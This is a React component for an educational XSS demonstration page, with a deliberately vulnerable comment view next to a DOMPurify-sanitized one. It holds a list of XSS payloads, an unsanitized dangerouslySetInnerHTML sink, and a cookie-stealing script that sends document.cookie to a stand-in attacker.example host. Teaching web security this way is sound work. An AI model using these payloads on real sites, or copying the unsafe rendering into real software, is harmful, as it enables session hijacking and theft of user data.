import { useState, useEffect, useRef } from 'react';
import { Typography, Input, Button, Card, Alert, Tabs, Space, Divider, Tag, Row, Col, List, Timeline, notification, Modal, Spin } from 'antd';
import { BugOutlined, SafetyOutlined, MessageOutlined, WarningOutlined, InfoCircleOutlined, EyeOutlined, CodeOutlined, CloseOutlined, CheckCircleOutlined, LoadingOutlined } from '@ant-design/icons';
import styled from 'styled-components';
import { Comment } from '../../types';
import apiService from '../../api/api';
import DOMPurify from 'dompurify';

const { Title, Paragraph, Text } = Typography;
const { TabPane } = Tabs;
const { TextArea } = Input;

// 样式组件
const CodeBlock = styled.pre`
  background-color: #f6f8fa;
  border-radius: 6px;
  padding: 16px;
  overflow: auto;
  font-family: monospace;
  position: relative;
  margin-bottom: 16px;
`;

const PreviewContainer = styled.div`
  margin-top: 16px;
  padding: 16px;
  border: 1px solid #d9d9d9;
  border-radius: 6px;
  background-color: white;
  min-height: 120px;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
  position: relative;
  overflow: hidden;
`;

const DemoContainer = styled.div`
  border: 2px dashed #ff4d4f;
  padding: 20px;
  border-radius: 6px;
  margin-top: 16px;
  position: relative;
  background-color: #fff2f0;
  box-shadow: 0 4px 12px rgba(255, 77, 79, 0.2);
  transition: all 0.3s ease;
  
  &:hover {
    box-shadow: 0 6px 16px rgba(255, 77, 79, 0.3);
  }
`;

const EffectAnimation = styled.div`
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(255, 0, 0, 0.1);
  border-radius: 6px;
  animation: pulse 2s infinite;
  pointer-events: none;
  z-index: 1;
  
  @keyframes pulse {
    0% {
      opacity: 0;
      box-shadow: inset 0 0 30px rgba(255, 0, 0, 0.3);
    }
    50% {
      opacity: 0.6;
      box-shadow: inset 0 0 50px rgba(255, 0, 0, 0.5);
    }
    100% {
      opacity: 0;
      box-shadow: inset 0 0 30px rgba(255, 0, 0, 0.3);
    }
  }
`;

const AlertPopupAnimation = styled.div`
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background-color: white;
  border: 1px solid #ccc;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  padding: 20px;
  border-radius: 8px;
  z-index: 1000;
  min-width: 300px;
  animation: popIn 0.3s ease-out forwards;
  
  @keyframes popIn {
    0% {
      transform: translate(-50%, -60%);
      opacity: 0;
    }
    100% {
      transform: translate(-50%, -50%);
      opacity: 1;
    }
  }
`;

const RedirectBanner = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  background-color: #ff4d4f;
  color: white;
  text-align: center;
  padding: 10px;
  z-index: 1000;
  animation: slideDown 0.5s ease-out forwards;
  
  @keyframes slideDown {
    from {
      transform: translateY(-100%);
    }
    to {
      transform: translateY(0);
    }
  }
`;

const CookieTheftAnimation = styled.div`
  position: relative;
  padding: 10px;
  background-color: #1f1f1f;
  border-radius: 6px;
  color: #52c41a;
  font-family: monospace;
  margin-top: 10px;
  
  &:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 2px;
    background: linear-gradient(90deg, #52c41a, transparent);
    animation: scanLine 1.5s ease-in-out infinite;
  }
  
  @keyframes scanLine {
    0% {
      transform: translateX(-100%);
    }
    100% {
      transform: translateX(100%);
    }
  }
`;

const TypingAnimation = styled.div`
  font-family: 'Courier New', monospace;
  position: relative;
  &::after {
    content: '|';
    position: absolute;
    right: -5px;
    animation: blink 1s step-end infinite;
  }
  @keyframes blink {
    50% { opacity: 0; }
  }
`;

const AttackVisualization = styled.div`
  margin-top: 20px;
  padding: 20px;
  background: #000;
  border-radius: 8px;
  color: #0f0;
  font-family: 'Courier New', monospace;
  position: relative;
  height: 200px;
  overflow: hidden;
`;

const XssCodeHighlight = styled.div`
  background-color: rgba(255, 77, 79, 0.1);
  padding: 2px 4px;
  border-radius: 4px;
  color: #ff4d4f;
  font-family: monospace;
  display: inline-block;
`;

// 定义不同类型的XSS攻击示例
const xssExamples = [
  { 
    name: "基本警告弹窗",
    payload: "<script>alert('XSS攻击')</script>",
    description: "最基本的XSS攻击，插入JavaScript脚本显示警告弹窗"
  },
  { 
    name: "图片标签攻击",
    payload: "<img src='x' onerror='alert(\"XSS通过图片标签\")'/>",
    description: "使用图片标签的onerror事件执行JavaScript"
  },
  { 
    name: "SVG标签攻击",
    payload: "<svg onload='alert(\"XSS通过SVG\")'></svg>",
    description: "使用SVG标签的onload事件执行JavaScript"
  },
  { 
    name: "链接跳转",
    payload: "<a href='javascript:alert(\"XSS通过链接\")'>点击我</a>",
    description: "使用JavaScript协议在链接中执行代码"
  },
  { 
    name: "事件处理",
    payload: "<div onmouseover='alert(\"XSS通过鼠标事件\")'>鼠标悬停触发</div>",
    description: "通过DOM事件处理器执行JavaScript"
  },
  { 
    name: "数据窃取演示",
    payload: "<div id='stolen' style='color:red'>正在窃取您的Cookie数据...</div><script>document.getElementById('stolen').innerText = '已窃取Cookie: ' + document.cookie</script>",
    description: "模拟窃取用户Cookie的XSS攻击"
  }
];

// 评论展示组件
const CommentDisplay = ({ comment, isSafe }: { comment: Comment; isSafe: boolean }) => {
  const [showAnimation, setShowAnimation] = useState(false);
  
  useEffect(() => {
    // 模拟XSS触发效果
    if (!isSafe && comment.comment.includes('<script>') || 
        comment.comment.includes('onerror=') || 
        comment.comment.includes('onload=')) {
      setShowAnimation(true);
      const timer = setTimeout(() => setShowAnimation(false), 5000);
      return () => clearTimeout(timer);
    }
  }, [comment.comment, isSafe]);

  return (
    <Card 
      size="small" 
      style={{ marginBottom: 8 }} 
      bordered={true}
    >
      <Space direction="vertical" style={{ width: '100%' }}>
        <div>
          <Text type="secondary">
            发布时间: {new Date(comment.timestamp).toLocaleString()}
          </Text>
        </div>
        <div style={{ position: 'relative' }}>
          {showAnimation && <EffectAnimation />}
          {isSafe ? (
            // 安全版本，使用DOMPurify净化HTML
            <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.comment) }} />
          ) : (
            // 不安全版本，直接渲染HTML (XSS漏洞)
            <div dangerouslySetInnerHTML={{ __html: comment.comment }} />
          )}
        </div>
      </Space>
    </Card>
  );
};

const XssAttack = () => {
  const [comment, setComment] = useState<string>('');
  const [comments, setComments] = useState<Comment[]>([]);
  const [loading, setLoading] = useState<boolean>(false);
  const [submitting, setSubmitting] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<string>('1');
  const [previewMode, setPreviewMode] = useState<boolean>(false);
  const [previewContent, setPreviewContent] = useState<string>('');
  const [showModal, setShowModal] = useState<boolean>(false);
  const [showLiveDemo, setShowLiveDemo] = useState<boolean>(false);
  const [demoContent, setDemoContent] = useState<string>('');
  const [cookieTheft, setCookieTheft] = useState<boolean>(false);
  const [alertVisible, setAlertVisible] = useState<boolean>(false);
  const [redirectVisible, setRedirectVisible] = useState<boolean>(false);
  const [typingEffect, setTypingEffect] = useState({ show: false, text: '', target: '' });
  const [showTerminal, setShowTerminal] = useState<boolean>(false);
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const [showPayload, setShowPayload] = useState<boolean>(false);
  const [xssPayload, setXssPayload] = useState<string>('');
  const [highlightedCode, setHighlightedCode] = useState<string>('');
  
  const previewFrameRef = useRef<HTMLIFrameElement>(null);

  // 获取评论
  const fetchComments = () => {
    setLoading(true);
    apiService.getComments()
      .then((response: any) => {
        setComments(response.data);
      })
      .catch(error => {
        console.error('获取评论失败:', error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  // 组件加载时获取评论
  useEffect(() => {
    fetchComments();
  }, []);

  // 提交评论
  const handleSubmitComment = () => {
    if (!comment.trim()) return;
    
    setSubmitting(true);
    
    // 如果评论包含潜在的XSS代码，提供更好的视觉反馈
    if (comment.includes('<script>') || 
        comment.includes('onerror=') || 
        comment.includes('onload=') ||
        comment.includes('javascript:')) {
      
      // 高亮显示代码中的危险部分
      const highlightedComment = comment
        .replace(/<script>/g, '<span style="color:red;background:#fff2f0;padding:2px 4px;border-radius:2px">&lt;script&gt;</span>')
        .replace(/<\/script>/g, '<span style="color:red;background:#fff2f0;padding:2px 4px;border-radius:2px">&lt;/script&gt;</span>')
        .replace(/onerror=/g, '<span style="color:red;background:#fff2f0;padding:2px 4px;border-radius:2px">onerror=</span>')
        .replace(/onload=/g, '<span style="color:red;background:#fff2f0;padding:2px 4px;border-radius:2px">onload=</span>')
        .replace(/javascript:/g, '<span style="color:red;background:#fff2f0;padding:2px 4px;border-radius:2px">javascript:</span>');
      
      setHighlightedCode(highlightedComment);
      setShowModal(true);
      
      // 模拟检测过程
      setTerminalLines([
        '> 检测到可疑XSS代码...',
        '> 分析代码模式...',
        `> 发现潜在危险标签: ${comment.includes('<script>') ? '<script>' : comment.includes('onerror=') ? 'onerror' : comment.includes('onload=') ? 'onload' : 'javascript:'}`
      ]);
      
      setShowTerminal(true);
      
      setTimeout(function() {
        setTerminalLines(prev => [...prev, 
          '> 确认为XSS攻击代码',
          '> 准备在不安全环境中执行...'
        ]);
      }, 1000);
      
      setTimeout(function() {
        setShowModal(false);
        setShowTerminal(false);
        
        // 继续正常提交
        apiService.addComment(comment)
          .then(function() {
            setComment('');
            fetchComments();
            
            notification.warning({
              message: '潜在XSS攻击',
              description: (
                <div>
                  <p>检测到您提交的评论包含可能的XSS攻击代码，这在实际环境中可能带来安全风险。</p>
                  <div style={{ marginTop: 8 }}>
                    <Tag color="error">危险代码已执行!</Tag>
                  </div>
                </div>
              ),
              duration: 0
            });
          })
          .catch(function(error) {
            console.error('提交评论失败:', error);
          })
          .finally(function() {
            setSubmitting(false);
          });
      }, 3000);
    } else {
      // 普通评论正常提交
      apiService.addComment(comment)
        .then(function() {
          setComment('');
          fetchComments();
        })
        .catch(function(error) {
          console.error('提交评论失败:', error);
        })
        .finally(function() {
          setSubmitting(false);
        });
    }
  };

  // 使用XSS示例
  const useXssExample = (payload: string) => {
    setComment(payload);
    setActiveTab('1'); // 切换到漏洞演示标签
    
    // 同时更新预览内容
    setPreviewContent(payload);
  };
  
  // 处理预览功能
  const handlePreview = () => {
    setPreviewContent(comment);
    setPreviewMode(true);
  };
  
  // 生成cookie窃取演示
  const showCookieTheftDemo = () => {
    setCookieTheft(true);
    
    // 开始打字动画效果
    setTypingEffect({
      show: true,
      text: '',
      target: '正在窃取Cookie数据...'
    });
    
    let index = 0;
    const textInterval = setInterval(() => {
      if (index < '正在窃取Cookie数据...'.length) {
        setTypingEffect(prev => ({
          ...prev,
          text: prev.text + '正在窃取Cookie数据...'[index]
        }));
        index++;
      } else {
        clearInterval(textInterval);
        
        // 显示窃取到的Cookie
        setTimeout(() => {
          setTypingEffect(prev => ({
            ...prev,
            text: '窃取成功! Cookie: ' + document.cookie || 'session_id=123456; user=admin; auth_token=abcdef123456'
          }));
          
          // 显示窃取信息已发送
          setTimeout(() => {
            setDemoContent(`
              <div style='color:red;font-weight:bold'>XSS攻击执行成功!</div>
              <div style='margin-top:10px'>窃取到的Cookie信息:</div>
              <code style='background:#f5f5f5;padding:5px;display:block;margin-top:5px'>
                ${document.cookie || 'session_id=123456; user=admin; auth_token=abcdef123456'}
              </code>
              <div style='margin-top:10px;color:red'>已发送至攻击者服务器: http://attacker.example/collect.php</div>
            `);
            setShowLiveDemo(true);
            
            notification.error({
              message: '安全警告',
              description: '检测到恶意脚本正在尝试窃取您的Cookie数据，这在真实场景中可能导致会话劫持！',
              duration: 0
            });
          }, 1000);
        }, 1000);
      }
    }, 100);
  };
  
  // 模拟XSS攻击效果
  const simulateXssEffect = (type: string) => {
    setShowModal(true);
    setShowTerminal(true);
    setTerminalLines([
      '> 正在准备XSS攻击脚本...',
      '> 分析目标网页DOM结构...',
      '> 构建恶意代码...'
    ]);

    // 根据攻击类型添加适当的终端输出
    const terminalUpdater = setInterval(() => {
      if (type === 'alert') {
        setTerminalLines(prev => [...prev, '> 注入alert弹窗代码...', '> 准备执行JavaScript注入...']);
        setXssPayload('<script>alert("XSS攻击")</script>');
      } else if (type === 'redirect') {
        setTerminalLines(prev => [...prev, '> 构建重定向脚本...', '> 准备执行跳转到恶意站点...']);
        setXssPayload('<script>window.location="http://malicious-site.example/"</script>');
      } else if (type === 'cookie') {
        setTerminalLines(prev => [...prev, '> 构建Cookie窃取代码...', '> 准备窃取用户认证信息...']);
        setXssPayload('<script>var img = new Image(); img.src = "http://attacker.example/steal.php?cookie=" + document.cookie;</script>');
      }
      setShowPayload(true);
      clearInterval(terminalUpdater);
    }, 1500);
    
    setTimeout(() => {
      setShowModal(false);
      setShowTerminal(false);
      setTerminalLines([]);
      
      if (type === 'alert') {
        setAlertVisible(true);
        setTimeout(() => setAlertVisible(false), 3000);
      } else if (type === 'redirect') {
        setRedirectVisible(true);
        setTimeout(() => setRedirectVisible(false), 3000);
      } else if (type === 'cookie') {
        showCookieTheftDemo();
      }
    }, 3000);
  };

  return (
    <div className="xss-attack-page">
      <Title level={2}>
        <BugOutlined /> XSS攻击漏洞演示
      </Title>

      <Paragraph>
        跨站脚本攻击(XSS)是一种Web安全漏洞，攻击者可以在网页中注入恶意脚本，当其他用户浏览该页面时，这些脚本会在用户的浏览器中执行。
        XSS攻击可以窃取用户信息、劫持用户会话或重定向用户到恶意网站。
      </Paragraph>

      <Alert
        message="安全警告"
        description="此页面仅用于教育目的，演示XSS攻击漏洞。在实际应用中，请务必净化用户输入和输出，防止XSS攻击。"
        type="warning"
        showIcon
        style={{ marginBottom: 24 }}
      />

      <Card title="XSS攻击示例与实时演示" style={{ marginBottom: 24 }}>
        <Paragraph>
          以下是一些常见的XSS攻击示例，您可以点击按钮查看实时演示效果：
        </Paragraph>
        <Row gutter={16}>
          <Col xs={24} md={12}>
            <Card 
              type="inner" 
              title="弹窗攻击" 
              extra={<Button type="primary" danger onClick={() => simulateXssEffect('alert')}>演示效果</Button>}
            >
              <CodeBlock>
                <code>&lt;script&gt;alert("XSS攻击")&lt;/script&gt;</code>
              </CodeBlock>
              <Text type="secondary">此代码会在页面加载时弹出警告窗口，实际攻击中可能用于确认XSS漏洞存在</Text>
            </Card>
          </Col>
          <Col xs={24} md={12}>
            <Card 
              type="inner" 
              title="重定向攻击" 
              extra={<Button type="primary" danger onClick={() => simulateXssEffect('redirect')}>演示效果</Button>}
            >
              <CodeBlock>
                <code>&lt;script&gt;window.location="http://malicious-site.example/"&lt;/script&gt;</code>
              </CodeBlock>
              <Text type="secondary">此代码会将用户重定向到恶意网站，可能用于钓鱼攻击</Text>
            </Card>
          </Col>
        </Row>
        <Row gutter={16} style={{ marginTop: 16 }}>
          <Col xs={24} md={24}>
            <Card 
              type="inner" 
              title="Cookie窃取攻击" 
              extra={<Button type="primary" danger onClick={() => simulateXssEffect('cookie')}>演示效果</Button>}
            >
              <CodeBlock>
                <code>&lt;script&gt;var img = new Image(); img.src = "http://attacker.example/steal.php?cookie=" + document.cookie;&lt;/script&gt;</code>
              </CodeBlock>
              <Text type="secondary">此代码会通过创建图片请求将用户的Cookie发送到攻击者服务器，可能导致会话劫持</Text>
            </Card>
          </Col>
        </Row>
        
        {showLiveDemo && (
          <DemoContainer>
            <div dangerouslySetInnerHTML={{ __html: demoContent }} />
            {cookieTheft && (
              <div>
                <EffectAnimation />
                {typingEffect.show && (
                  <CookieTheftAnimation>
                    <TypingAnimation>{typingEffect.text}</TypingAnimation>
                  </CookieTheftAnimation>
                )}
              </div>
            )}
          </DemoContainer>
        )}
      </Card>

      <Card title="更多XSS攻击示例" style={{ marginBottom: 24 }}>
        <List
          dataSource={xssExamples}
          grid={{ gutter: 16, xs: 1, sm: 1, md: 2, lg: 2, xl: 2, xxl: 3 }}
          renderItem={(item, index) => (
            <List.Item>
              <Card 
                size="small" 
                hoverable 
                title={
                  <Space>
                    <WarningOutlined style={{ color: '#ff4d4f' }} />
                    {item.name}
                  </Space>
                }
                style={{ backgroundColor: '#fff2e8' }}
              >
                <p>{item.description}</p>
                <div style={{ margin: '8px 0' }}>
                  <Tag color="error">{item.payload}</Tag>
                </div>
                <Button 
                  type="link" 
                  size="small" 
                  onClick={() => useXssExample(item.payload)}
                  style={{ padding: 0 }}
                >
                  使用此示例
                </Button>
              </Card>
            </List.Item>
          )}
        />
      </Card>

      <Tabs activeKey={activeTab} onChange={setActiveTab} style={{ marginBottom: 32 }}>
        <TabPane 
          tab={<span><BugOutlined /> 不安全版本 (易受攻击)</span>} 
          key="1"
        >
          <Alert
            message="漏洞提示"
            description="此版本直接将用户输入的HTML渲染到页面，容易受到XSS攻击。"
            type="error"
            showIcon
            style={{ marginBottom: 16 }}
          />
          
          <CodeBlock>
            <code>
              // 不安全的方式 - 直接渲染用户输入的HTML<br/>
              {'<div dangerouslySetInnerHTML={{ __html: userInput }} />'}
            </code>
          </CodeBlock>
          
          <Divider />
          
          <div style={{ marginBottom: 16 }}>
            <TextArea
              rows={4}
              value={comment}
              onChange={(e) => setComment(e.target.value)}
              placeholder="输入评论（可以包含HTML或JavaScript代码）"
            />
          </div>
          
          <Space>
            <Button
              type="primary"
              danger
              icon={<MessageOutlined />}
              onClick={handleSubmitComment}
              loading={submitting}
              disabled={!comment.trim()}
            >
              发表评论 (不安全)
            </Button>
            
            <Button
              icon={<EyeOutlined />}
              onClick={handlePreview}
              disabled={!comment.trim()}
            >
              预览效果
            </Button>
          </Space>
          
          {previewMode && previewContent && (
            <PreviewContainer>
              <div>
                <Text strong>预览效果（存在XSS漏洞）:</Text>
                <Button 
                  size="small" 
                  onClick={() => setPreviewMode(false)} 
                  style={{ float: 'right' }}
                >
                  关闭预览
                </Button>
              </div>
              <Divider style={{ margin: '8px 0' }} />
              <div dangerouslySetInnerHTML={{ __html: previewContent }} />
            </PreviewContainer>
          )}
          
          <Divider orientation="left">已发表的评论</Divider>
          
          <Spin spinning={loading}>
            <div>
              {comments.length > 0 ? (
                comments.map((comment, index) => (
                  <CommentDisplay key={index} comment={comment} isSafe={false} />
                ))
              ) : (
                <Alert message="暂无评论" type="info" />
              )}
            </div>
          </Spin>
        </TabPane>
        
        <TabPane 
          tab={<span><SafetyOutlined /> 安全版本 (已防护)</span>} 
          key="2"
        >
          <Alert
            message="安全提示"
            description={
              <div>
                此版本使用 DOMPurify 库净化用户输入，防止XSS攻击。
                <div style={{marginTop: 8}}>
                  <Tag color="success">安全示例: {`DOMPurify.sanitize(userInput)`}</Tag>
                </div>
              </div>
            }
            type="success"
            showIcon
            style={{ marginBottom: 16 }}
          />
          
          <CodeBlock>
            <code>
              // 安全的方式 - 使用DOMPurify净化HTML<br/>
              {'import DOMPurify from "dompurify";'}<br/>
              {'<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />'}
            </code>
          </CodeBlock>
          
          <Divider />
          
          <div style={{ marginBottom: 16 }}>
            <TextArea
              rows={4}
              value={comment}
              onChange={(e) => setComment(e.target.value)}
              placeholder="输入评论（HTML或JavaScript代码将被净化）"
            />
          </div>
          
          <Space>
            <Button
              type="primary"
              icon={<MessageOutlined />}
              onClick={handleSubmitComment}
              loading={submitting}
              disabled={!comment.trim()}
            >
              发表评论 (安全)
            </Button>
            
            <Button
              icon={<EyeOutlined />}
              onClick={handlePreview}
              disabled={!comment.trim()}
            >
              预览效果（已净化）
            </Button>
          </Space>
          
          {previewMode && previewContent && (
            <PreviewContainer>
              <div>
                <Text strong>预览效果（已净化XSS代码）:</Text>
                <Button 
                  size="small" 
                  onClick={() => setPreviewMode(false)} 
                  style={{ float: 'right' }}
                >
                  关闭预览
                </Button>
              </div>
              <Divider style={{ margin: '8px 0' }} />
              <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(previewContent) }} />
            </PreviewContainer>
          )}
          
          <Divider orientation="left">已发表的评论</Divider>
          
          <Spin spinning={loading}>
            <div>
              {comments.length > 0 ? (
                comments.map((comment, index) => (
                  <CommentDisplay key={index} comment={comment} isSafe={true} />
                ))
              ) : (
                <Alert message="暂无评论" type="info" />
              )}
            </div>
          </Spin>
        </TabPane>
      </Tabs>
      
      {/* 增强的XSS攻击视觉效果 */}
      {alertVisible && (
        <AlertPopupAnimation>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <WarningOutlined style={{ color: '#ff4d4f', fontSize: 24, marginRight: 10 }} />
              <div>
                <div style={{ fontWeight: 'bold', marginBottom: 5 }}>XSS攻击警告</div>
                <div>此页面存在跨站脚本攻击</div>
              </div>
            </div>
            <Button 
              type="text" 
              icon={<CloseOutlined />} 
              onClick={() => setAlertVisible(false)}
            />
          </div>
        </AlertPopupAnimation>
      )}
      
      {redirectVisible && (
        <RedirectBanner>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <WarningOutlined style={{ marginRight: 10 }} />
            <span>正在重定向到恶意网站: <Text code>http://malicious-site.example/</Text> [已阻止]</span>
          </div>
        </RedirectBanner>
      )}
      
      {/* 增强的模态窗口 */}
      <Modal
        title={
          <div style={{ display: 'flex', alignItems: 'center' }}>
            <BugOutlined style={{ color: '#ff4d4f', marginRight: 10 }} />
            <span>XSS攻击模拟</span>
          </div>
        }
        open={showModal}
        footer={null}
        closable={false}
        style={{ top: 20 }}
        width={600}
      >
        <div style={{ padding: '20px 0' }}>
          {!showTerminal ? (
            <div style={{ textAlign: 'center' }}>
              <Spin size="large" />
              <p style={{ marginTop: 16 }}>正在执行XSS攻击代码...</p>
            </div>
          ) : (
            <div>
              <div style={{ 
                background: '#000', 
                color: '#0f0', 
                fontFamily: 'monospace', 
                padding: 10, 
                borderRadius: 4, 
                marginBottom: 16, 
                maxHeight: 200,
                overflow: 'auto'
              }}>
                {terminalLines.map((line, i) => (
                  <div key={i}>{line}</div>
                ))}
              </div>
              
              {showPayload && (
                <div>
                  <Divider orientation="left">
                    <Text type="danger">注入的恶意代码</Text>
                  </Divider>
                  <pre style={{ 
                    background: '#fff2f0', 
                    padding: 10, 
                    borderRadius: 4, 
                    border: '1px solid #ffccc7',
                    color: '#ff4d4f'
                  }}>
                    {xssPayload}
                  </pre>
                </div>
              )}
              
              {highlightedCode && (
                <div>
                  <Divider orientation="left">
                    <Text type="danger">检测到的XSS代码</Text>
                  </Divider>
                  <div style={{ 
                    background: '#fff2f0', 
                    padding: 10, 
                    borderRadius: 4, 
                    border: '1px solid #ffccc7'
                  }} dangerouslySetInnerHTML={{ __html: highlightedCode }} />
                </div>
              )}
            </div>
          )}
        </div>
      </Modal>
    </div>
  );
};

export default XssAttack; 